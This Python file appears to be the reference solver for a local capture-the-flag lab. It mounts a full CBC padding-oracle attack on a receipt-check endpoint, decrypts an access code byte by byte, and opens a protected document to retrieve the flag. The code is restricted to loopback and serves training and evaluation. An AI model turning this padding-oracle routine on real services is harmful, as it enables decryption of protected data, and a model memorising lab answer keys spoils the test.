"""Stdlib-only reference attack for the local SealDesk training instance.

This evaluator helper is not shipped in the application image. It accepts only
loopback HTTP on port 8080 and never prints receipt plaintext or recovered codes.
"""

from __future__ import annotations

import argparse
import base64
import binascii
from dataclasses import dataclass, field
import json
import re
import subprocess
import sys
from html.parser import HTMLParser
from pathlib import Path
from typing import Any, Callable
from urllib.error import HTTPError, URLError
from urllib.parse import urlsplit
from urllib.request import HTTPRedirectHandler, ProxyHandler, Request, build_opener

BLOCK_SIZE = 16
RECEIPT_FIELDS = frozenset({"version", "iv", "ciphertext", "tag"})
_FIELD_RE = re.compile(r"[A-Za-z0-9_-]+\Z")
_CODE_RE = re.compile(r"[0-9a-f]{32}\Z")
_FLAG_RE = re.compile(r"duck\{[a-z0-9_]{16,40}\}\Z")
_DOCUMENT_ID_RE = re.compile(r"[A-Z0-9-]{1,64}\Z")


class SolveError(RuntimeError):
    """The supplied page, receipt, oracle, or recovered value was unexpected."""


def _encode_field(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode("ascii")


def _decode_field(value: Any) -> bytes:
    if not isinstance(value, str) or not _FIELD_RE.fullmatch(value):
        raise SolveError("The public receipt is not in the expected format.")
    try:
        decoded = base64.b64decode(value + "=" * (-len(value) % 4), altchars=b"-_", validate=True)
    except (binascii.Error, ValueError) as error:
        raise SolveError("The public receipt is not in the expected format.") from error
    if _encode_field(decoded) != value:
        raise SolveError("The public receipt is not in the expected format.")
    return decoded


def _validate_receipt(receipt: Any) -> tuple[str, bytes, bytes, str]:
    if not isinstance(receipt, dict) or set(receipt) != RECEIPT_FIELDS:
        raise SolveError("The public receipt is not in the expected format.")
    if receipt["version"] != "SDR1":
        raise SolveError("The public receipt version is unsupported.")
    iv = _decode_field(receipt["iv"])
    ciphertext = _decode_field(receipt["ciphertext"])
    tag = _decode_field(receipt["tag"])
    if len(iv) != BLOCK_SIZE or not ciphertext or len(ciphertext) > 256:
        raise SolveError("The public receipt is not in the expected format.")
    if len(ciphertext) % BLOCK_SIZE or len(tag) != 32:
        raise SolveError("The public receipt is not in the expected format.")
    return receipt["version"], iv, ciphertext, receipt["tag"]


class _ReceiptHTMLParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.active = False
        self.seen = False
        self.duplicate = False
        self.chunks: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag.lower() != "textarea":
            return
        attributes = dict(attrs)
        if attributes.get("id") != "receipt-json":
            return
        if self.seen:
            self.duplicate = True
            return
        self.seen = True
        self.active = True

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "textarea" and self.active:
            self.active = False

    def handle_data(self, data: str) -> None:
        if self.active:
            self.chunks.append(data)


def extract_receipt_from_html(markup: str) -> dict[str, str]:
    """Parse the editable receipt from the real workbench HTML, not a fixture."""
    if not isinstance(markup, str):
        raise SolveError("The workbench page is not text.")
    parser = _ReceiptHTMLParser()
    try:
        parser.feed(markup)
        parser.close()
    except (AssertionError, ValueError) as error:
        raise SolveError("The workbench receipt could not be read.") from error
    if not parser.seen or parser.duplicate or parser.active:
        raise SolveError("The workbench page does not contain one complete receipt.")
    try:
        receipt = json.loads("".join(parser.chunks))
    except (json.JSONDecodeError, TypeError) as error:
        raise SolveError("The workbench receipt is not valid JSON.") from error
    _validate_receipt(receipt)
    return receipt


def validate_base_url(value: str) -> str:
    """Allow only the explicitly scoped local HTTP service origin."""
    if not isinstance(value, str) or len(value) > 256:
        raise SolveError("Use the local SealDesk URL on 127.0.0.1:8080.")
    try:
        parsed = urlsplit(value)
        hostname = parsed.hostname
        if (
            parsed.scheme == "http"
            and hostname in {"127.0.0.1", "localhost"}
            and parsed.port == 8080
            and parsed.username is None
            and parsed.password is None
            and parsed.path in {"", "/"}
            and not parsed.query
            and not parsed.fragment
        ):
            return f"http://{hostname}:8080"
    except ValueError:
        pass
    raise SolveError("Use the local SealDesk URL on 127.0.0.1:8080.")


def _ask_oracle(oracle: Callable[[dict[str, str]], bool], probe: dict[str, str]) -> bool:
    try:
        answer = oracle(probe)
    except SolveError:
        raise
    except Exception as error:
        raise SolveError("The local receipt service could not answer a probe.") from error
    if type(answer) is not bool:
        raise SolveError("The local receipt service returned an unexpected response.")
    return answer


def _recover_intermediate(
    version: str,
    target_block: bytes,
    original_tag: str,
    original_previous: bytes,
    oracle: Callable[[dict[str, str]], bool],
) -> bytes:
    intermediate = bytearray(BLOCK_SIZE)
    for padding_value in range(1, BLOCK_SIZE + 1):
        position = BLOCK_SIZE - padding_value
        crafted = bytearray(original_previous)
        for offset in range(1, padding_value):
            crafted[-offset] = intermediate[-offset] ^ padding_value

        candidates: list[int] = []
        for candidate in range(256):
            crafted[position] = candidate
            probe = {
                "version": version,
                "iv": _encode_field(bytes(crafted)),
                "ciphertext": _encode_field(target_block),
                "tag": original_tag,
            }
            if not _ask_oracle(oracle, probe):
                continue

            # A one-byte suffix can also be a longer, pre-existing valid pad.
            # Flipping the preceding plaintext byte preserves 0x01 and rejects
            # that accidental longer suffix.
            if padding_value == 1 and position > 0:
                confirmation = bytearray(crafted)
                confirmation[position - 1] ^= 1
                confirm_probe = dict(probe)
                confirm_probe["iv"] = _encode_field(bytes(confirmation))
                if not _ask_oracle(oracle, confirm_probe):
                    continue
            candidates.append(candidate)

        if len(candidates) != 1:
            raise SolveError("The receipt response did not identify one padding candidate.")
        intermediate[position] = candidates[0] ^ padding_value
    return bytes(intermediate)


def _unpad(plaintext: bytes) -> bytes:
    if not plaintext:
        raise SolveError("The recovered receipt plaintext is empty.")
    padding_value = plaintext[-1]
    if (
        not 1 <= padding_value <= BLOCK_SIZE
        or plaintext[-padding_value:] != bytes([padding_value]) * padding_value
    ):
        raise SolveError("The recovered receipt padding is invalid.")
    return plaintext[:-padding_value]


def recover_access_code(
    receipt: dict[str, Any],
    oracle: Callable[[dict[str, str]], bool],
    document_id: str,
) -> str:
    """Recover the separately required code using only the boolean pad oracle."""
    version, original_iv, ciphertext, original_tag = _validate_receipt(receipt)
    if not isinstance(document_id, str) or not _DOCUMENT_ID_RE.fullmatch(document_id):
        raise SolveError("The public document identifier is not in the expected format.")

    padded_plaintext = bytearray()
    block_count = len(ciphertext) // BLOCK_SIZE
    for index in range(block_count):
        start = index * BLOCK_SIZE
        target_block = ciphertext[start : start + BLOCK_SIZE]
        original_previous = original_iv if index == 0 else ciphertext[start - BLOCK_SIZE : start]
        intermediate = _recover_intermediate(
            version, target_block, original_tag, original_previous, oracle
        )
        padded_plaintext.extend(
            left ^ right for left, right in zip(intermediate, original_previous)
        )

    plaintext = _unpad(bytes(padded_plaintext))
    prefix = f"SDR1|{document_id}|".encode("ascii")
    if not plaintext.startswith(prefix):
        raise SolveError("The recovered receipt does not match this document.")
    code = plaintext[len(prefix) :].decode("ascii", errors="strict")
    if not _CODE_RE.fullmatch(code):
        raise SolveError("The recovered receipt does not contain one access code.")
    return code


@dataclass(frozen=True, slots=True)
class SolveResult:
    document_id: str
    document_title: str
    access_code: str = field(repr=False)
    flag: str = field(repr=False)


class _NoRedirectHandler(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def _request_bytes(opener, url: str, payload: dict[str, Any] | None = None) -> tuple[int, bytes]:
    headers = {"Accept": "application/json, text/html;q=0.9"}
    body = None
    method = "GET"
    if payload is not None:
        body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
        headers["Content-Type"] = "application/json"
        method = "POST"
    request = Request(url, data=body, headers=headers, method=method)
    try:
        response = opener.open(request, timeout=5)
    except HTTPError as error:
        response = error
    except (OSError, URLError, TimeoutError, ValueError) as error:
        raise SolveError("The local SealDesk service could not be reached.") from error
    try:
        status = getattr(response, "status", None)
        if status is None:
            status = response.code
        body = response.read(32769)
    except (OSError, ValueError) as error:
        raise SolveError("The local SealDesk service returned an unreadable response.") from error
    finally:
        response.close()
    if len(body) > 32768:
        raise SolveError("The local SealDesk service returned an oversized response.")
    return status, body


def _json_body(body: bytes) -> dict[str, Any]:
    try:
        value = json.loads(body.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as error:
        raise SolveError("The local SealDesk service returned invalid JSON.") from error
    if not isinstance(value, dict):
        raise SolveError("The local SealDesk service returned an unexpected response.")
    return value


def solve_http(base_url: str = "http://127.0.0.1:8080") -> SolveResult:
    """Solve the current loopback instance through its actual HTTP interface."""
    origin = validate_base_url(base_url)
    opener = build_opener(ProxyHandler({}), _NoRedirectHandler())

    status, markup_bytes = _request_bytes(opener, origin + "/")
    if status != 200:
        raise SolveError("The local SealDesk workbench page could not be loaded.")
    try:
        markup = markup_bytes.decode("utf-8")
    except UnicodeDecodeError as error:
        raise SolveError("The local SealDesk workbench page is not valid UTF-8.") from error
    receipt = extract_receipt_from_html(markup)

    status, case_bytes = _request_bytes(opener, origin + "/case")
    if status != 200:
        raise SolveError("The public SealDesk case could not be loaded.")
    case = _json_body(case_bytes)
    document_id = case.get("document_id")
    case_receipt = case.get("receipt")
    if not isinstance(document_id, str) or case_receipt != receipt:
        raise SolveError("The workbench and public case do not describe the same document.")

    def oracle(probe: dict[str, str]) -> bool:
        response_status, response_bytes = _request_bytes(
            opener, origin + "/api/receipts/check", probe
        )
        response = _json_body(response_bytes)
        response_kind = response.get("status")
        if response_status == 422 and response_kind == "damaged_envelope":
            return False
        if response_status == 422 and response_kind == "untrusted_envelope":
            return True
        if response_status == 200 and response_kind == "valid_receipt":
            return True
        raise SolveError("The receipt service returned an unexpected oracle response.")

    access_code = recover_access_code(receipt, oracle, document_id)
    response_status, response_bytes = _request_bytes(
        opener,
        origin + "/api/documents/open",
        {"document_id": document_id, "access_code": access_code},
    )
    response = _json_body(response_bytes)
    document = response.get("document")
    flag = response.get("flag")
    if (
        response_status != 200
        or response.get("status") != "document_opened"
        or not isinstance(document, dict)
        or not isinstance(document.get("title"), str)
        or not isinstance(flag, str)
        or not _FLAG_RE.fullmatch(flag)
    ):
        raise SolveError("The recovered code could not open the local document.")
    return SolveResult(document_id, document["title"], access_code, flag)


def _check_with_repository_checker(flag: str) -> bool:
    lab_directory = Path(__file__).resolve().parents[1]
    repository_root = lab_directory.parents[2]
    checker = repository_root / "scripts" / "check.py"
    if not checker.is_file():
        raise SolveError("The repository flag checker is unavailable beside this lab.")
    try:
        result = subprocess.run(
            [sys.executable, str(checker), str(lab_directory)],
            input=flag + "\n",
            capture_output=True,
            text=True,
            encoding="utf-8",
            timeout=10,
            check=False,
        )
    except (OSError, subprocess.SubprocessError) as error:
        raise SolveError("The repository flag checker could not be run.") from error
    return result.returncode == 0


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Solve the local SealDesk training instance.")
    parser.add_argument("--url", default="http://127.0.0.1:8080", help="local instance URL")
    arguments = parser.parse_args(argv)
    try:
        result = solve_http(arguments.url)
        if not _check_with_repository_checker(result.flag):
            raise SolveError(
                "The recovered flag was not accepted. Run the local flag-hash sync helper after startup."
            )
    except SolveError as error:
        print(str(error), file=sys.stderr)
        return 1
    print("Solved: the repository flag checker accepted the local result.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
